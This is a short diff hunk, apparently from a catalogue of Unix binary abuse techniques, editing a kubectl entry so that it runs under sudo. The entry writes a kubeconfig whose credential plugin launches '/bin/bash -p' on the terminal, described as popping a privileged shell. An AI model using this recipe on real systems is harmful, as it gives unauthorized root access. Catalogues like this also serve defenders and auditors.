@@ -71,6 +71,6 @@ functions:
                 - "/bin/bash -p </dev/tty >/dev/tty 2>/dev/tty"
               interactiveMode: Always
         EOF
-        ./kubectl get pods --kubeconfig=/tmp/config 
+        sudo kubectl get pods --kubeconfig=/tmp/config 
       description: "It pops a new privileged shell using custom configuration"
 ---
